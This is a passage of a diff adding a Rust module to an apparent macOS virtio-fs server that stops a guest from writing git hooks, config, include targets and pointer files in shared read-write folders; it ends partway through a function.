@@ -1,0 +1,3891 @@
+diff --git a/src/devices/src/virtio/fs/macos/confined/git.rs b/src/devices/src/virtio/fs/macos/confined/git.rs
+new file mode 100644
+index 0000000..b5d59ad
+--- /dev/null
++++ b/src/devices/src/virtio/fs/macos/confined/git.rs
+@@ -0,0 +1,1406 @@
++// R15: host-executed configuration in read-write folders (owner M6: block), as revised for H1-H5.
++//
++// Active on read-write folder-source devices only (`ShareFlags::folder_rules`). Every check runs on the
++// device thread inside the request, through the server's held descriptors (R2): names are compared folded
++// on a case-insensitive volume (`_PC_CASE_SENSITIVE`) and existing entries by (dev, ino); git directories
++// are recognised wherever they sit; the protected zone is every git directory and everything below a
++// directory named `.git`, except git's own `refs/` and `logs/` subtrees; config changes only through
++// git's own lock-and-rename, against the allowlist; pointer files are buffered until FLUSH or RELEASE and
++// checked; hooks, tracked hooks and include targets are immutable. A refusal is `EPERM` and reports a
++// `git_protected` notice; an allowed write to a watched name reports its own notice.
++
++use std::collections::{HashMap, HashSet, VecDeque};
++use std::ffi::CString;
++use std::io::{self, Read};
++use std::os::fd::{AsRawFd, OwnedFd, RawFd};
++use std::sync::Arc;
++
++use super::gitconfig::{self, ConfigEntry};
++use super::notice::NoticeKind;
++use super::sys::{self, err, lx};
++use super::{check_name, dev_ino, kind_of, ConfinedFs, Kind, Mutation, State, LINUX_RENAME_EXCHANGE, ROOT_ID};
++use crate::virtio::fs::filesystem::SetattrValid;
++
++/// A pointer file's buffered content may not exceed this; more is `EPERM`.
++pub const POINTER_MAX: usize = 4096;
++/// A config file the server reads (the rename source, or a config it re-validates) may not exceed this.
++pub const CONFIG_MAX: u64 = 1 << 20;
++/// git's own include depth limit.
++pub const INCLUDE_DEPTH: usize = 10;
++/// Symbolic links followed while resolving one tracked path.
++const LINK_HOPS: usize = 40;
++/// Directories below one repository's `modules/` and `worktrees/` read at discovery; beyond this the whole
++/// git directory is held immutable (the strict treatment).
++pub const SCAN_BUDGET: usize = 4096;
++/// Nesting below `modules/` and `worktrees/` read at discovery (a submodule name may hold slashes).
++const SCAN_DEPTH: usize = 16;
++
++/// The names of every git hook (githooks(5)); husky v9's `.husky/<hook>` files carry these names.
++pub const GIT_HOOKS: [&str; 28] = [
++    "applypatch-msg",
++    "pre-applypatch",
++    "post-applypatch",
++    "pre-commit",
++    "pre-merge-commit",
++    "prepare-commit-msg",
++    "commit-msg",
++    "post-commit",
++    "pre-rebase",
++    "post-checkout",
++    "post-merge",
++    "pre-push",
++    "pre-receive",
++    "update",
++    "proc-receive",
++    "post-receive",
++    "post-update",
++    "reference-transaction",
++    "push-to-checkout",
++    "pre-auto-gc",
++    "post-rewrite",
++    "sendemail-validate",
++    "fsmonitor-watchman",
++    "p4-changelist",
++    "p4-prepare-changelist",
++    "p4-post-changelist",
++    "p4-pre-submit",
++    "post-index-change",
++];
++
++const CONFIGS: [&str; 2] = ["config", "config.worktree"];
++const MARKERS: [&str; 3] = ["HEAD", "commondir", "gitdir"];
++
++/// Folds a name as APFS compares names on a case-insensitive volume, for comparison with the protected
++/// names: ASCII case, plus every code point whose canonical decomposition and case folding is ASCII
++/// (U+212A KELVIN SIGN, U+017F LONG S, U+037E, U+1FEF, and the full folds of U+00DF, U+1E9E and the
++/// U+FB00-U+FB06 ligatures, which only ever make the match wider). Any other code point stays non-ASCII,
++/// so it can never fold onto an ASCII name.
++pub fn fold(name: &[u8]) -> String {
++    let text = String::from_utf8_lossy(name);
++    let mut out = String::with_capacity(text.len());
++    for c in text.chars() {
++        match c {
++            '\u{212A}' => out.push('k'),
++            '\u{017F}' => out.push('s'),
++            '\u{037E}' => out.push(';'),
++            '\u{1FEF}' => out.push('`'),
++            '\u{00DF}' | '\u{1E9E}' => out.push_str("ss"),
++            '\u{FB00}' => out.push_str("ff"),
++            '\u{FB01}' => out.push_str("fi"),
++            '\u{FB02}' => out.push_str("fl"),
++            '\u{FB03}' => out.push_str("ffi"),
++            '\u{FB04}' => out.push_str("ffl"),
++            '\u{FB05}' | '\u{FB06}' => out.push_str("st"),
++            _ => out.extend(c.to_lowercase()),
++        }
++    }
++    out
++}
++
++#[derive(Clone, Copy, Debug, PartialEq, Eq)]
++pub enum PointerKind {
++    /// `.git` as a regular file: `gitdir: <path>`.
++    Gitfile,
++    /// A worktree's `commondir`.
++    Commondir,
++    /// A worktree's `gitdir`.
++    Gitdir,
++}
++
++/// A pointer file's content as the guest writes it; nothing reaches the host until it is checked.
++pub struct Pointer {
++    pub kind: PointerKind,
++    pub buf: Vec<u8>,
++    pub dirty: bool,
++}
++
++/// What R15 makes of one existing node.
++#[derive(Clone, Copy, Debug, PartialEq, Eq)]
++pub enum Class {
++    Plain,
++    /// A hooks entry, anything below one, a tracked hook or an include target: no mutation at all.
++    Immutable,
++    /// `config` or `config.worktree` in the zone: changed only by the checked lock rename.
++    Config,
++    /// A pointer file: written only through a checked buffer.
++    Pointer(PointerKind),
++}
++
++/// A tracked path (a `core.hooksPath` tree, a husky hook, an include target), held by its chain of names
++/// from the share root so a target that does not exist yet is protected too.
++#[derive(Clone, Debug, PartialEq, Eq)]
++pub struct Target {
++    pub chain: Vec<Vec<u8>>,
++    pub tree: bool,
++    /// The path as written (lexical, links not resolved): each of its components, and every link met while
++    /// resolving it, is a protected name that cannot be removed, renamed, replaced or re-pointed.
++    pub written: Vec<Vec<u8>>,
++    /// Only the written names are protected, not what they reach (a `.git` link: the git directory it
++    /// reaches is the zone instead, where git keeps working).
++    pub names_only: bool,
++}
++
++/// The R15 state of one device.
++pub struct GitState {
++    pub case_sensitive: bool,
++    /// Protected entries seen so far, by (dev, ino), so a second spelling is recognised whatever its bytes.
++    held: HashMap<(u64, u64), Class>,
++    /// Tracked hooks and include targets (only ever grows within an incarnation).
++    pub targets: Vec<Target>,
++    /// (git directory, work tree top) pairs whose configuration was read.
++    repos: HashSet<((u64, u64), (u64, u64))>,
++    /// Git directories reached through a symbolic link named `.git`: their whole subtree is treated as
++    /// lying below a `.git` (the zone), by identity.
++    zone_roots: HashSet<(u64, u64)>,
++}
++
++impl GitState {
++    pub fn new(case_sensitive: bool) -> Self {
++        GitState { case_sensitive, held: HashMap::new(), targets: Vec::new(), repos: HashSet::new(), zone_roots: HashSet::new() }
++    }
++
++    /// Whether `name` is the protected name `want` on this volume.
++    pub fn is(&self, name: &[u8], want: &str) -> bool {
++        if self.case_sensitive {
++            name == want.as_bytes()
++        } else {
++            fold(name) == fold(want.as_bytes())
++        }
++    }
++
++    fn is_any(&self, name: &[u8], wants: &[&str]) -> bool {
++        wants.iter().any(|w| self.is(name, w))
++    }
++
++    fn ends(&self, name: &[u8], suffix: &str) -> bool {
++        if self.case_sensitive {
++            name.ends_with(suffix.as_bytes())
++        } else {
++            fold(name).ends_with(&fold(suffix.as_bytes()))
++        }
++    }
++
++    /// Whether a new name may alias a missing tracked name. Folded equality; and where the tracked name
++    /// keeps a non-ASCII character after folding, any non-ASCII name (the server does not carry the full
++    /// Unicode decomposition tables, so it refuses wider rather than narrower).
++    fn may_alias(&self, name: &[u8], tracked: &[u8]) -> bool {
++        if self.case_sensitive {
++            return name == tracked;
++        }
++        let (a, b) = (fold(name), fold(tracked));
++        a == b || (!a.is_ascii() && !b.is_ascii())
++    }
++
++    fn add_target(&mut self, target: Target) {
++        if !self.targets.contains(&target) {
++            self.targets.push(target);
++        }
++    }
++}
++
++/// One directory on a chain from the share root: its name in its parent (empty for the root), a held
++/// descriptor and its identity.
++#[derive(Clone)]
++struct Hop {
++    name: Vec<u8>,
++    fd: Arc<OwnedFd>,
++    id: (u64, u64),
++}
++
++/// Where a directory sits.
++#[derive(Clone, Copy, Debug, Default)]
++struct Place {
++    /// Inside a `refs/` or `logs/` subtree directly below a git directory.
++    exempt: bool,
++    /// The directory or an ancestor is named `.git`.
++    dotgit: bool,
++    /// The directory is a git directory (named `.git`, or holding `HEAD`, `commondir` or `gitdir`).
++    git_dir: bool,
++    /// The protected zone: a git directory, or anything below a `.git`, outside the exempt subtrees.
++    zone: bool,
++}
++
++/// The result of resolving a path inside the share, without ever following a link on the host.
++enum Walk {
++    /// An existing directory, with its whole chain.
++    Dir(Vec<Hop>),
++    /// An existing non-directory.
++    File { parent: Vec<Hop>, name: Vec<u8>, stat: libc::stat },
++    /// The path stops existing at `rest[0]` inside the last directory of `parent`.
++    Missing { parent: Vec<Hop>, rest: Vec<Vec<u8>> },
++    /// Leaves the share, crosses a device, holds a name R1 refuses, a non-directory in the middle, or too
++    /// many links.
++    Outside,
++    /// A link where none is allowed (pointer targets).
++    Link,
++}
++
++#[derive(Clone, Copy, Debug, PartialEq, Eq)]
++enum Tracked {
++    Tree,
++    File,
++    NamesOnly,
++}
++
++#[derive(Clone, Copy, Debug, PartialEq, Eq)]
++enum How {
++    File,
++    Dir,
++    Symlink,
++    Link,
++    RenameFile,
++    RenameDir,
++}
++
++#[derive(Clone, Copy, Debug, PartialEq, Eq)]
++enum Removal {
++    Unlink,
++    Rmdir,
++    RenameOut,
++}
++
++fn refuse<T>() -> io::Result<T> {
++    Err(err(lx::EPERM))
++}
++
++fn cstring(name: &[u8]) -> io::Result<CString> {
++    CString::new(name).map_err(|_| err(lx::EINVAL))
++}
++
++fn ids(chain: &[Hop]) -> Vec<(u64, u64)> {
++    chain.iter().map(|h| h.id).collect()
++}
++
++/// The path of a gitfile, as git reads it for discovery (`gitdir: ` and trailing whitespace trimmed).
++fn gitfile_path(text: &[u8]) -> Option<&[u8]> {
++    let mut path = text.strip_prefix(b"gitdir: ")?;
++    while let Some((last, rest)) = path.split_last() {
++        if last.is_ascii_whitespace() {
++            path = rest;
++        } else {
++            break;
++        }
++    }
++    (!path.is_empty()).then_some(path)
++}
++
++/// The one line a pointer file may hold: its form exactly, one optional trailing newline, nothing else.
++fn pointer_line(buf: &[u8], kind: PointerKind) -> Option<&[u8]> {
++    let body = buf.strip_suffix(b"\n").unwrap_or(buf);
++    if body.is_empty() || body.iter().any(|b| matches!(*b, b'\n' | b'\r' | 0)) {
++        return None;
++    }
++    match kind {
++        PointerKind::Gitfile => body.strip_prefix(b"gitdir: ").filter(|p| !p.is_empty()),
++        _ => Some(body),
++    }
++}
++
++impl ConfinedFs {
++    // ---- the host view ----------------------------------------------------------------------------
++
++    fn root_hop(&self, st: &State) -> io::Result<Hop> {
++        let fd = st.root.clone().ok_or_else(|| err(lx::EACCES))?;
++        Ok(Hop { name: Vec::new(), fd, id: (self.root_dev, self.root_ino) })
++    }
++
++    /// The chain of directories from the root to directory node `id` (inclusive).
++    fn node_chain(&self, st: &mut State, id: u64) -> io::Result<Vec<Hop>> {
++        let mut path = Vec::new();
++        let mut current = id;
++        while current != ROOT_ID {
++            if path.len() > st.nodes.len() {
++                return Err(err(lx::ESTALE));
++            }
++            path.push(current);
++            current = st.nodes.get(&current).ok_or_else(|| err(lx::ESTALE))?.parent;
++        }
++        let mut chain = vec![self.root_hop(st)?];
++        for node in path.into_iter().rev() {
++            let fd = self.dir_fd(st, node)?;
++            let n = &st.nodes[&node];
++            chain.push(Hop { name: n.name.to_bytes().to_vec(), fd, id: (n.dev, n.ino) });
++        }
++        Ok(chain)
++    }
++
++    /// The entry `name` of a held directory, never followed; `None` when it does not exist.
++    fn holds(&self, dir: RawFd, name: &[u8]) -> io::Result<Option<libc::stat>> {
++        match self.host.fstatat(dir, &cstring(name)?) {
++            Ok(s) => Ok(Some(s)),
++            Err(e) if e.raw_os_error() == Some(lx::ENOENT) => Ok(None),
++            Err(e) => Err(e),
++        }
++    }
++
++    /// Reads a small regular file through a fresh descriptor, confirmed to be the entry `expect` (R2).
++    /// Anything but a regular file, or more than `max` bytes, is refused.
++    fn read_small(&self, dir: RawFd, name: &[u8], expect: &libc::stat, max: u64) -> io::Result<Vec<u8>> {
++        let fd = self.host.openat(dir, &cstring(name)?, libc::O_RDONLY | libc::O_NONBLOCK, 0)?;
++        let s = sys::fstat(&fd)?;
++        if dev_ino(&s) != dev_ino(expect) {
++            return Err(err(lx::ESTALE));
++        }
++        if kind_of(s.st_mode) != Kind::File {
++            return refuse();
++        }
++        let mut text = Vec::new();
++        std::fs::File::from(fd).take(max + 1).read_to_end(&mut text)?;
++        if text.len() as u64 > max {
++            return refuse();
++        }
++        Ok(text)
++    }
++
++    fn hop_into(&self, chain: &[Hop], name: &[u8], s: &libc::stat) -> io::Result<Hop> {
++        let parent = chain.last().ok_or_else(|| err(lx::ESTALE))?;
++        let fd = self.open_dir_at(parent.fd.as_raw_fd(), &cstring(name)?, s.st_dev as u64, s.st_ino)?;
++        Ok(Hop { name: name.to_vec(), fd: Arc::new(fd), id: dev_ino(s) })
++    }
++
++    /// A path a config or pointer file names: relative (to `base`), or absolute under the share's guest
++    /// mount path. `~` and any other absolute path are outside the share.
++    fn split_path(&self, text: &[u8]) -> Option<(bool, Vec<Vec<u8>>)> {
++        let parts = |t: &[u8]| t.split(|b| *b == b'/').map(|p| p.to_vec()).collect::<Vec<_>>();
++        if text.first() == Some(&b'~') {
++            return None;
++        }
++        if text.first() != Some(&b'/') {
++            return Some((false, parts(text)));
++        }
++        let mut guest = self.guest_path.to_bytes();
++        while guest.len() > 1 && guest.ends_with(b"/") {
++            guest = &guest[..guest.len() - 1];
++        }
++        if guest.is_empty() {
++            return None;
++        }
++        if guest == b"/" {
++            return Some((true, parts(&text[1..])));
++        }
++        if text == guest {
++            return Some((true, Vec::new()));
++        }
++        match text.strip_prefix(guest) {
++            Some(rest) if rest.first() == Some(&b'/') => Some((true, parts(&rest[1..]))),
++            _ => None,
++        }
++    }
++
++    /// Resolves `comps` from `start` through held descriptors. `follow`: a link on the way is read and
++    /// resolved by the server itself (inside the share only); otherwise a link ends the walk.
++    fn walk(&self, st: &State, start: Vec<Hop>, comps: Vec<Vec<u8>>, follow: bool) -> io::Result<Walk> {
++        self.walk_noting(st, start, comps, follow, None)
++    }
++
++    /// `walk`, also noting (directory identity, name) of every component it meets, links included.
++    fn walk_noting(&self, st: &State, start: Vec<Hop>, comps: Vec<Vec<u8>>, follow: bool, mut seen: Option<&mut Vec<((u64, u64), Vec<u8>)>>) -> io::Result<Walk> {
++        let root = self.root_hop(st)?;
++        let mut chain = start;
++        let mut queue: VecDeque<Vec<u8>> = comps.into();
++        let mut links = 0;
++        while let Some(c) = queue.pop_front() {
++            if c.is_empty() || c == b"." {
++                continue;
++            }
++            if c == b".." {
++                if chain.len() <= 1 {
++                    return Ok(Walk::Outside);
++                }
++                chain.pop();
++                continue;
++            }
++            if check_name(&c).is_err() {
++                return Ok(Walk::Outside);
++            }
++            let dir = chain.last().ok_or_else(|| err(lx::ESTALE))?.fd.clone();
++            if let Some(seen) = seen.as_deref_mut() {
++                seen.push((chain.last().map(|h| h.id).unwrap_or_default(), c.clone()));
++            }
++            let Some(s) = self.holds(dir.as_raw_fd(), &c)? else {
++                let mut rest = vec![c];
++                rest.extend(queue);
++                return Ok(Walk::Missing { parent: chain, rest });
++            };
++            if s.st_dev as u64 != self.root_dev {
++                return Ok(Walk::Outside);
++            }
++            let more = queue.iter().any(|q| !q.is_empty() && q != b".");
++            match kind_of(s.st_mode) {
++                Kind::Symlink => {
++                    if !follow {
++                        return Ok(Walk::Link);
++                    }
++                    links += 1;
++                    if links > LINK_HOPS {
++                        return Ok(Walk::Outside);
++                    }
++                    let text = self.host.readlinkat(dir.as_raw_fd(), &cstring(&c)?)?;
++                    let Some((absolute, parts)) = self.split_path(&text) else { return Ok(Walk::Outside) };
++                    if absolute {
++                        chain = vec![root.clone()];
++                    }
++                    for part in parts.into_iter().rev() {
++                        queue.push_front(part);
++                    }
++                }
++                Kind::Dir => {
++                    let hop = self.hop_into(&chain, &c, &s)?;
++                    chain.push(hop);
++                }
++                _ if more => return Ok(Walk::Outside),
++                _ => return Ok(Walk::File { parent: chain, name: c, stat: s }),
++            }
++        }
++        Ok(Walk::Dir(chain))
++    }
++
++    fn walk_text(&self, st: &State, base: Vec<Hop>, text: &[u8], follow: bool) -> io::Result<Walk> {
++        let Some((absolute, parts)) = self.split_path(text) else { return Ok(Walk::Outside) };
++        let start = if absolute { vec![self.root_hop(st)?] } else { base };
++        self.walk(st, start, parts, follow)
++    }
++
++    // ---- git directories and the zone --------------------------------------------------------------
++
++    fn is_git_dir(&self, g: &GitState, hop: &Hop) -> io::Result<bool> {
++        if !hop.name.is_empty() && g.is(&hop.name, ".git") {
++            return Ok(true);
++        }
++        for marker in MARKERS {
++            if self.holds(hop.fd.as_raw_fd(), marker.as_bytes())?.is_some() {
++                return Ok(true);
++            }
++        }
++        Ok(false)
++    }
++
++    fn place(&self, g: &GitState, chain: &[Hop]) -> io::Result<Place> {
++        let mut place = Place::default();
++        for i in 0..chain.len() {
++            if g.zone_roots.contains(&chain[i].id) {
++                place.dotgit = true;
++            }
++            if i == 0 {
++                continue;
++            }
++            let name = &chain[i].name;
++            if g.is(name, ".git") {
++                place.dotgit = true;
++            }
++            if !place.exempt && g.is_any(name, &["refs", "logs"]) && self.is_git_dir(g, &chain[i - 1])? {
++                place.exempt = true;
++            }
++        }
++        if place.exempt {
++            return Ok(place);
++        }
++        place.git_dir = match chain.last() {
++            Some(hop) => self.is_git_dir(g, hop)?,
++            None => false,
++        };
++        place.zone = place.git_dir || place.dotgit;
++        Ok(place)
++    }
++
++    /// The chain passes through an entry named `hooks` in the zone.
++    fn below_hooks(&self, g: &GitState, chain: &[Hop]) -> io::Result<bool> {
++        for i in 1..chain.len() {
++            if g.is(&chain[i].name, "hooks") && self.place(g, &chain[..i])?.zone {
++                return Ok(true);
++            }
++        }
++        Ok(false)
++    }
++
++    /// `config` or `config.worktree` in this directory fails the allowlist with every key treated as added
++    /// (or is not a readable regular file of at most 1 MiB).
++    fn failing_config(&self, g: &GitState, chain: &[Hop]) -> io::Result<bool> {
++        let dir = chain.last().ok_or_else(|| err(lx::ESTALE))?.fd.as_raw_fd();
++        for name in CONFIGS {
++            let Some(s) = self.holds(dir, name.as_bytes())? else { continue };
++            let Ok(text) = self.read_small(dir, name.as_bytes(), &s, CONFIG_MAX) else { return Ok(true) };
++            let Ok(entries) = gitconfig::parse(&text) else { return Ok(true) };
++            let mut ok = |v: &[u8]| self.worktree_ok(g, chain, v);
++            if entries.iter().any(|e| !gitconfig::admitted(e, &mut ok)) {
++                return Ok(true);
++            }
++        }
++        Ok(false)
++    }
++
++    /// The creation-order test (H5): the directory holds a `hooks` entry or a non-admitted config.
++    fn failing_dir(&self, g: &GitState, chain: &[Hop]) -> io::Result<bool> {
++        let dir = chain.last().ok_or_else(|| err(lx::ESTALE))?.fd.as_raw_fd();
++        Ok(self.holds(dir, b"hooks")?.is_some() || self.failing_config(g, chain)?)
++    }
++
++    /// `core.worktree` is admitted only in a submodule's own git directory (strictly below a `modules/`
++    /// directly under a git directory of a `.git` chain), as a relative path to a directory of the share
++    /// outside every `.git`: exactly what `git submodule update` writes.
++    fn worktree_ok(&self, g: &GitState, chain: &[Hop], value: &[u8]) -> bool {
++        let located = (1..chain.len().saturating_sub(1)).any(|k| {
++            g.is(&chain[k].name, "modules") && matches!(self.place(g, &chain[..k]), Ok(p) if p.git_dir && p.dotgit && !p.exempt)
++        });
++        if !located || value.is_empty() || matches!(value[0], b'/' | b'~') {
++            return false;
++        }
++        let mut names: Vec<Vec<u8>> = chain[1..].iter().map(|h| h.name.clone()).collect();
++        for part in value.split(|b| *b == b'/') {
++            match part {
++                b"" | b"." => {}
++                b".." => {
++                    if names.pop().is_none() {
++                        return false;
++                    }
++                }
++                other => names.push(other.to_vec()),
++            }
++        }
++        !names.iter().any(|n| g.is(n, ".git"))
++    }
++
++    // ---- tracked hooks and include targets (T17b) --------------------------------------------------
++
++    /// Discovery (before anything below `dir` is served): if `dir` holds a `.git` or is a git directory,
++    /// that repository's configuration is read and its tracked hooks and include targets recorded.
++    pub(super) fn git_discover(&self, st: &mut State, dir: u64) -> io::Result<()> {
++        let Some(mut g) = st.git.take() else { return Ok(()) };
++        let res = self.node_chain(st, dir).and_then(|chain| self.discover_chain(st, &mut g, &chain));
++        st.git = Some(g);
++        res
++    }
++
++    fn discover_chain(&self, st: &State, g: &mut GitState, chain: &[Hop]) -> io::Result<()> {
++        let last = chain.last().ok_or_else(|| err(lx::ESTALE))?;
++        let dir = last.fd.as_raw_fd();
++        if let Some(s) = self.holds(dir, b".git")? {
++            if s.st_dev as u64 == self.root_dev {
++                match kind_of(s.st_mode) {
++                    Kind::Dir => {
++                        let mut git_dir = chain.to_vec();
++                        git_dir.push(self.hop_into(chain, b".git", &s)?);
++                        self.discover_git_dir(st, g, &git_dir, chain, false)?;
++                    }
++                    // A `.git` that is a link (made on the Mac): resolved by the server's own walk inside the
++                    // share; the git directory it reaches is the zone by identity, and the link and every
++                    // hop to it are protected names.
++                    Kind::Symlink => match self.track(st, g, chain.to_vec(), b".git", Tracked::NamesOnly)? {
++                        Some(Walk::Dir(git_dir)) => {
++                            if let Some(hop) = git_dir.last() {
++                                g.zone_roots.insert(hop.id);
++                            }
++                            self.discover_git_dir(st, g, &git_dir, chain, false)?;
++                        }
++                        // A gitfile (or anything else) reached through a link is held immutable.
++                        Some(_) => {
++                            self.track(st, g, chain.to_vec(), b".git", Tracked::File)?;
++                        }
++                        None => {}
++                    },
++                    Kind::File => {
++                        if let Ok(text) = self.read_small(dir, b".git", &s, POINTER_MAX as u64) {
++                            if let Some(path) = gitfile_path(&text) {
++                                if let Walk::Dir(git_dir) = self.walk_text(st, chain.to_vec(), path, true)? {
++                                    self.discover_git_dir(st, g, &git_dir, chain, false)?;
++                                }
++                            }
++                        }
++                    }
++                    _ => {}
++                }
++            }
++        }
++        if self.is_git_dir(g, last)? {
++            let top = if !last.name.is_empty() && g.is(&last.name, ".git") { &chain[..chain.len() - 1] } else { chain };
++            self.discover_git_dir(st, g, chain, top, false)?;
++        }
++        Ok(())
++    }
++
++    fn discover_git_dir(&self, st: &State, g: &mut GitState, git_dir: &[Hop], top: &[Hop], again: bool) -> io::Result<()> {
++        let hop = git_dir.last().ok_or_else(|| err(lx::ESTALE))?;
++        if !g.repos.insert((hop.id, top.last().map(|h| h.id).unwrap_or_default())) && !again {
++            return Ok(());
++        }
++        let mut files: Vec<(Vec<Hop>, &[u8])> = vec![(git_dir.to_vec(), b"config"), (git_dir.to_vec(), b"config.worktree")];
++        if let Some(s) = self.holds(hop.fd.as_raw_fd(), b"commondir")? {
++            if let Ok(text) = self.read_small(hop.fd.as_raw_fd(), b"commondir", &s, POINTER_MAX as u64) {
++                let path = text.strip_suffix(b"\n").unwrap_or(&text);
++                if let Walk::Dir(common) = self.walk_text(st, git_dir.to_vec(), path, true)? {
++                    files.push((common, b"config"));
++                }
++            }
++        }
++        for (dir, name) in files {
++            self.collect(st, g, &dir, name, top, 0)?;
++        }
++        // Links among the names git reads here (made on the Mac): what they reach is held immutable.
++        for (name, how) in [(&b"hooks"[..], Tracked::Tree), (b"commondir", Tracked::File), (b"gitdir", Tracked::File)] {
++            if self.holds(hop.fd.as_raw_fd(), name)?.is_some_and(|s| kind_of(s.st_mode) == Kind::Symlink) {
++                self.track(st, g, git_dir.to_vec(), name, how)?;
++            }
++        }
++        // Nested git directories (submodules, worktrees) are read now too, before anything below is
++        // served; past the budget the whole git directory is held immutable.
++        let mut budget = SCAN_BUDGET;
++        for sub in [&b"modules"[..], b"worktrees"] {
++            if let Some(s) = self.holds(hop.fd.as_raw_fd(), sub)? {
++                if kind_of(s.st_mode) == Kind::Dir {
++                    let mut chain = git_dir.to_vec();
++                    chain.push(self.hop_into(git_dir, sub, &s)?);
++                    if !self.scan_nested(st, g, &chain, 0, &mut budget)? {
++                        let names: Vec<Vec<u8>> = git_dir[1..].iter().map(|h| h.name.clone()).collect();
++                        g.add_target(Target { chain: names.clone(), tree: true, written: names, names_only: false });
++                        self.notices.push(NoticeKind::GitProtected);
++                        return Ok(());
++                    }
++                }
++            }
++        }
++        Ok(())
++    }
++
++    /// Reads every git directory below `chain` (no links followed). `false` when the budget or the depth
++    /// ran out.
++    fn scan_nested(&self, st: &State, g: &mut GitState, chain: &[Hop], depth: usize, budget: &mut usize) -> io::Result<bool> {
++        if depth >= SCAN_DEPTH {
++            return Ok(false);
++        }
++        let dir = chain.last().ok_or_else(|| err(lx::ESTALE))?.fd.as_raw_fd();
++        for name in sys::list_dir(dir)? {
++            let Some(s) = self.holds(dir, &name)? else { continue };
++            if kind_of(s.st_mode) != Kind::Dir || s.st_dev as u64 != self.root_dev || check_name(&name).is_err() {
++                continue;
++            }
++            if *budget == 0 {
++                return Ok(false);
++            }
++            *budget -= 1;
++            let mut child = chain.to_vec();
++            child.push(self.hop_into(chain, &name, &s)?);
++            if self.is_git_dir(g, child.last().ok_or_else(|| err(lx::ESTALE))?)? {
++                self.discover_git_dir(st, g, &child, &child, false)?;
++            } else if !self.scan_nested(st, g, &child, depth + 1, budget)? {
++                return Ok(false);
++            }
++        }
++        Ok(true)
++    }
++
++    /// Reads one config file and records its `core.hooksPath` tree (and husky v9's hook files) and every
++    /// include target under any condition, following nested includes to git's depth limit.
++    fn collect(&self, st: &State, g: &mut GitState, dir: &[Hop], name: &[u8], top: &[Hop], depth: usize) -> io::Result<()> {
++        let fd = dir.last().ok_or_else(|| err(lx::ESTALE))?.fd.as_raw_fd();
++        let Some(s) = self.holds(fd, name)? else { return Ok(()) };
++        if kind_of(s.st_mode) == Kind::Symlink {
++            // A config that is a link (made on the Mac): git follows it. The link and every hop are protected
++            // names, what it reaches is immutable, and that file is read like the config itself.
++            if let Some(Walk::File { parent, name, .. }) = self.track(st, g, dir.to_vec(), name, Tracked::File)? {
++                if depth + 1 < INCLUDE_DEPTH {
++                    self.collect(st, g, &parent, &name, top, depth + 1)?;
++                }
++            }
++            return Ok(());
++        }
++        // A config the server cannot read or parse fails closed: it is held immutable (it names hooks the
++        // server cannot see), and the refusal is reported.
++        let entries = match self.read_small(fd, name, &s, CONFIG_MAX).map(|t| gitconfig::parse(&t)) {
++            Ok(Ok(entries)) => entries,
++            _ => {
++                self.track(st, g, dir.to_vec(), name, Tracked::File)?;
++                self.notices.push(NoticeKind::GitProtected);
++                return Ok(());
++            }
++        };
++        for e in entries {
++            let Some(value) = e.value.as_deref() else { continue };
++            if e.section == "core" && e.subsection.is_none() && e.key == "hookspath" {
++                self.track(st, g, top.to_vec(), value, Tracked::Tree)?;
++            }
++            let include = (e.section == "include" && e.subsection.is_none()) || (e.section == "includeif" && e.subsection.is_some());
++            if include && e.key == "path" {
++                if let Some(Walk::File { parent, name, .. }) = self.track(st, g, dir.to_vec(), value, Tracked::File)? {
++                    if depth + 1 < INCLUDE_DEPTH {
++                        self.collect(st, g, &parent, &name, top, depth + 1)?;
++                    }
++                }
++            }
++        }
++        Ok(())
++    }
++
++    /// Records the path `text` (relative to `base`) as a tracked target; a husky v9 hooks path
++    /// (`.husky/_`) also tracks `.husky/<hook>` for every git hook.
++    fn track(&self, st: &State, g: &mut GitState, base: Vec<Hop>, text: &[u8], how: Tracked) -> io::Result<Option<Walk>> {
++        let (tree, names_only) = (how == Tracked::Tree, how == Tracked::NamesOnly);
++        // The written path, lexically from the root (links not resolved).
++        let written = match self.split_path(text) {
++            None => None,
++            Some((absolute, parts)) => {
++                let mut names: Vec<Vec<u8>> = if absolute { Vec::new() } else { base[1..].iter().map(|h| h.name.clone()).collect() };
++                let mut ok = true;
++                for part in parts {
++                    match part.as_slice() {
++                        b"" | b"." => {}
++                        b".." => ok &= names.pop().is_some(),
++                        _ => names.push(part),
++                    }
++                }
++                (ok && !names.is_empty()).then_some(names)
++            }
++        };
++        let walk = self.walk_text(st, base, text, true)?;
++        if let (Walk::Outside | Walk::Link, Some(written)) = (&walk, &written) {
++            // Out of the share: only the names on the way here stay protected.
++            g.add_target(Target { chain: Vec::new(), tree: false, written: written.clone(), names_only: true });
++        }
++        let chain: Vec<Vec<u8>> = match &walk {
++            Walk::Dir(c) => c[1..].iter().map(|h| h.name.clone()).collect(),
++            Walk::File { parent, name, .. } => parent[1..].iter().map(|h| h.name.clone()).chain([name.clone()]).collect(),
++            Walk::Missing { parent, rest } => {
++                let mut names: Vec<Vec<u8>> = parent[1..].iter().map(|h| h.name.clone()).collect();
++                for part in rest {
++                    match part.as_slice() {
++                        b"" | b"." => {}
++                        b".." => {
++                            if names.pop().is_none() {
++                                return Ok(None);
++                            }
++                        }
++                        other => names.push(other.to_vec()),
++                    }
++                }
++                names
++            }
++            Walk::Outside | Walk::Link => return Ok(None),
++        };
++        if chain.is_empty() {
++            return Ok(None);
++        }
++        let written = written.unwrap_or_else(|| chain.clone());
++        let n = chain.len();
++        if tree && n >= 2 && g.is(&chain[n - 2], ".husky") && g.is(&chain[n - 1], "_") {
++            for hook in GIT_HOOKS {
++                let mut file = chain[..n - 1].to_vec();
++                file.push(hook.as_bytes().to_vec());
++                let mut by_name = written[..written.len().saturating_sub(1)].to_vec();
++                by_name.push(hook.as_bytes().to_vec());
++                g.add_target(Target { chain: file, tree: false, written: by_name, names_only: false });
++            }
++        }
++        g.add_target(Target { chain, tree, written, names_only });
++        Ok(Some(walk))
++    }
++
++    fn resolve_targets(&self, st: &State, g: &GitState) -> io::Result<Vec<(bool, Walk)>> {
++        let root = self.root_hop(st)?;
++        g.targets.iter().filter(|t| !t.names_only).map(|t| Ok((t.tree, self.walk(st, vec![root.clone()], t.chain.clone(), true)?))).collect()
++    }
++
++    /// Every protected name of the tracked paths: (directory identity, name) of each component of a
++    /// written path, and of every link met while resolving it.
++    fn protected_names(&self, st: &State, g: &GitState) -> io::Result<Vec<((u64, u64), Vec<u8>)>> {
++        let root = self.root_hop(st)?;
++        let mut names = Vec::new();
++        for t in &g.targets {
